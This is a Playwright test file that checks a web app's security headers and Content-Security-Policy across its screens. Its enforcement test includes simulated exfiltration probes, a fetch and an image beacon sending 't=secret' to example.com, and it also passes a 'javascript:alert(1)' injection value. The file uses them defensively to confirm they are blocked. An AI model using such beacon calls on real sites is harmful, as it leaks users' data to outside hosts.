// The production build, served with its real headers. Every screen is
// visited and used; any Content-Security-Policy violation fails the run.
import { expect, test, type Page } from "@playwright/test";
import { securityHeaders } from "../security-headers.mjs";
import { PASSWORD, freshEmail, pdfFile } from "../tests/helpers";

/** Collects CSP violations from the console and from the DOM event. */
function watch(page: Page): string[] {
  const found: string[] = [];
  page.on("console", (m) => {
    if (/Content Security Policy|Content-Security-Policy/i.test(m.text())) found.push(`console: ${m.text()}`);
  });
  page.on("pageerror", (e) => found.push(`page error: ${e.message}`));
  return found;
}

async function armViolationEvents(page: Page) {
  await page.addInitScript(() => {
    const w = window as unknown as { __cspViolations: string[] };
    w.__cspViolations = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      w.__cspViolations.push(`${e.violatedDirective} blocked ${e.blockedURI || "inline"} on ${location.pathname}`);
    });
  });
}

const events = (page: Page) =>
  page.evaluate(() => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? []);

test("the production headers are the ones in security-headers.mjs", async ({ request }) => {
  const expected = securityHeaders({ dev: false, apiBase: "mock" });
  for (const path of ["/login", "/about", "/privacy", "/", "/applications/12", "/icon.svg"]) {
    const res = await request.get(path);
    expect(res.status(), path).toBe(200);
    const got = res.headers();
    for (const h of expected) expect(got[h.key.toLowerCase()], `${h.key} on ${path}`).toBe(h.value);
    expect(got["x-powered-by"], path).toBeUndefined();
  }

  const csp = expected.find((h) => h.key === "Content-Security-Policy")!.value;
  expect(csp).toBe(
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self'; img-src 'self' data:; " +
      "font-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
  );
  expect(csp).not.toContain("unsafe-eval");
  expect(csp).not.toContain("*");
});

test("an API origin and an upload host are added to connect-src, and nothing else", () => {
  const csp = (o: Parameters<typeof securityHeaders>[0]) =>
    securityHeaders(o).find((h) => h.key === "Content-Security-Policy")!.value;
  expect(csp({ apiBase: "https://api.step1.example/v1/", uploadOrigin: "https://bucket.s3.amazonaws.com" })).toContain(
    "connect-src 'self' https://api.step1.example https://bucket.s3.amazonaws.com;"
  );
  expect(csp({ apiBase: "mock" })).toContain("connect-src 'self';");
  expect(csp({})).toContain("connect-src 'self';");
  expect(csp({ apiBase: "javascript:alert(1)" })).toContain("connect-src 'self';");
  // dev is looser, production never is
  expect(csp({ dev: true })).toContain("'unsafe-eval'");
  expect(csp({ dev: false })).not.toContain("'unsafe-eval'");
});

test("every screen works under the policy with no violations", async ({ page }, info) => {
  const found = watch(page);
  await armViolationEvents(page);
  const visited: string[] = [];
  const check = async (screen: string) => {
    visited.push(screen);
    expect(await events(page), `violations on: ${screen}`).toEqual([]);
    expect(found, `violations by: ${screen}`).toEqual([]);
  };

  // public
  await page.goto("/about");
  await expect(page.getByTestId("stat-active_postings")).toHaveText("4,769");
  await check("about");
  await page.goto("/privacy");
  await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
  await check("privacy");

  // sign in (register), which proves the page hydrated and scripts run
  await page.goto("/login");
  await page.getByRole("tab", { name: "Register" }).click();
  await page.getByLabel("Email").fill(freshEmail("csp"));
  await page.getByLabel("Password").fill(PASSWORD);
  await page.getByRole("button", { name: "Create account" }).click();
  await expect(page).toHaveURL(/\/onboarding$/);
  await check("login");

  // onboarding, with an upload
  await page.getByLabel("Major").fill("Information Science");
  for (const n of ["+ Security", "+ Software Engineering", "+ Research"]) {
    await page.getByRole("button", { name: n }).click();
  }
  await page.getByRole("button", { name: "Move Research up" }).click();
  await page.locator("#resume-file").setInputFiles(pdfFile());
  await expect(page.getByRole("list", { name: "Extracted skills" })).toBeVisible();
  await check("onboarding");

  // building (the progress bar is the one thing that used to need an inline style)
  await page.evaluate(() => localStorage.setItem("step1.mock.stuck", "1"));
  await page.getByTestId("submit-profile").click();
  await expect(page).toHaveURL(/\/onboarding\/building/);
  await expect(page.getByTestId("building-step")).toHaveText("Scanning 4,139 open internships");
  const bar = page.getByRole("progressbar");
  await expect(bar).toHaveAttribute("aria-valuenow", "60");
  const filled = await bar.locator("rect").nth(1).boundingBox();
  const whole = await bar.boundingBox();
  expect(filled!.width / whole!.width).toBeCloseTo(0.6, 1); // it really draws 60%
  await check("building");
  await page.evaluate(() => localStorage.removeItem("step1.mock.stuck"));

  // dashboard
  await page.goto("/");
  await expect(page.getByTestId("posting-card").first()).toBeVisible();
  await expect(page.getByTestId("freshness")).toBeVisible();
  await page.getByRole("radio", { name: "Best match" }).click();
  await expect(page).toHaveURL(/sort=score/);
  await page.getByTestId("load-more").click();
  await expect(page.getByTestId("posting-card")).toHaveCount(40);
  await check("dashboard");

  if (info.project.name === "mobile") {
    await page.getByTestId("open-filters").click();
    await page.getByRole("checkbox", { name: "Security" }).check();
    await check("filter sheet");
    await page.getByTestId("close-filters").click();
  } else {
    await page.getByRole("checkbox", { name: "Security" }).check();
  }
  await expect(page).toHaveURL(/roles=security/);
  await page.goto("/?roles=security&location=Seattle");
  await expect(page.getByTestId("relaxations")).toBeVisible();
  await check("dashboard, empty state");

  // save, apply
  await page.goto("/");
  const card = page.getByTestId("posting-card").filter({ has: page.getByTestId("apply-button") }).first();
  const id = await card.getAttribute("data-posting-id");
  const mine = page.locator(`[data-posting-id="${id}"]`);
  await mine.getByTestId("save-toggle").click();
  await mine.getByTestId("apply-button").click();
  await expect(page.getByTestId("confirm-applied")).toBeVisible();
  await check("I applied dialog");
  await page.getByTestId("confirm-applied").click();
  await expect(mine.getByTestId("application-link")).toBeVisible();

  await page.goto("/saved");
  await expect(page.getByTestId("posting-card").first()).toBeVisible();
  await check("saved");

  await page.goto("/applications");
  await expect(page.getByTestId("application-row").first()).toBeVisible();
  await check("applications");

  // timeline (a server-rendered route) and its dialog
  await page.getByTestId("application-row").first().click();
  await expect(page).toHaveURL(/\/applications\/\d+$/);
  await expect(page.getByTestId("timeline")).toBeVisible();
  await check("timeline");
  await page.getByTestId("add-note").click();
  await page.getByPlaceholder("What do you want to remember?").fill("Written under the production policy");
  await check("event dialog");
  await page.getByTestId("save-event").click();
  await expect(page.getByTestId("timeline")).toContainText("Written under the production policy");

  // profile and the delete dialog, then really delete
  await page.goto("/onboarding");
  await page.getByTestId("open-delete").click();
  await expect(page.getByTestId("confirm-delete")).toBeVisible();
  await check("delete dialog");
  await page.getByLabel("Your password").fill(PASSWORD);
  await page.getByRole("dialog").getByRole("checkbox").check();
  await page.getByTestId("confirm-delete").click();
  await expect(page).toHaveURL(/\/login\?deleted=1$/);
  await check("login after deletion");

  // 14 screens and dialogs at desktop width; the filter sheet makes 15 on a phone
  expect(visited.length).toBeGreaterThanOrEqual(14);
});

test("the policy is enforced: a foreign request, an image beacon, eval and an inline style are all blocked", async ({ page }) => {
  await armViolationEvents(page);
  await page.goto("/about");
  await expect(page.getByTestId("stat-active_postings")).toHaveText("4,769");

  const result = await page.evaluate(async () => {
    const out: Record<string, string> = {};
    // a request to a host that is not on the list
    try {
      await fetch("https://example.com/collect?t=secret", { mode: "no-cors" });
      out.fetch = "sent";
    } catch {
      out.fetch = "blocked";
    }
    // an image beacon to a host that is not on the list
    out.image = await new Promise<string>((resolve) => {
      const img = new Image();
      img.onload = () => resolve("loaded");
      img.onerror = () => resolve("blocked");
      img.src = "https://example.com/pixel.gif?t=secret";
      setTimeout(() => resolve("blocked"), 3000);
    });
    // eval
    try {
      out.eval = String((0, eval)("1 + 1"));
    } catch {
      out.eval = "blocked";
    }
    // an inline style attribute written as markup
    const probe = document.createElement("div");
    probe.setAttribute("style", "position: fixed");
    document.body.append(probe);
    out.inlineStyle = getComputedStyle(probe).position === "fixed" ? "applied" : "blocked";
    probe.remove();
    return out;
  });
  expect(result).toEqual({ fetch: "blocked", image: "blocked", eval: "blocked", inlineStyle: "blocked" });
  const seen = await events(page);
  expect(seen.some((v) => v.startsWith("connect-src"))).toBe(true);
  expect(seen.some((v) => v.startsWith("img-src"))).toBe(true);
});

test("the site can't be framed", async ({ page, request }) => {
  const res = await request.get("/login");
  expect(res.headers()["x-frame-options"]).toBe("DENY");
  expect(res.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
  await page.goto("/about");
  expect(await page.evaluate(() => window.top === window.self)).toBe(true);
});
